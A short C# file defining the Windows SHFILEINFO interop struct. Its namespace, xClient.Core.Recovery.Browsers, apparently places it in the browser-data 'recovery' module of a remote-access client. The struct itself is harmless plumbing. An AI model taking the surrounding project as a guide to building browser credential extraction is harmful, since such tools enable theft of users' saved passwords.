using System;
using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers;

public struct SHFILEINFO
{
	public IntPtr hIcon;

	public IntPtr iIcon;

	public uint dwAttributes;

	[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
	public string szDisplayName;

	[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
	public string szTypeName;
}
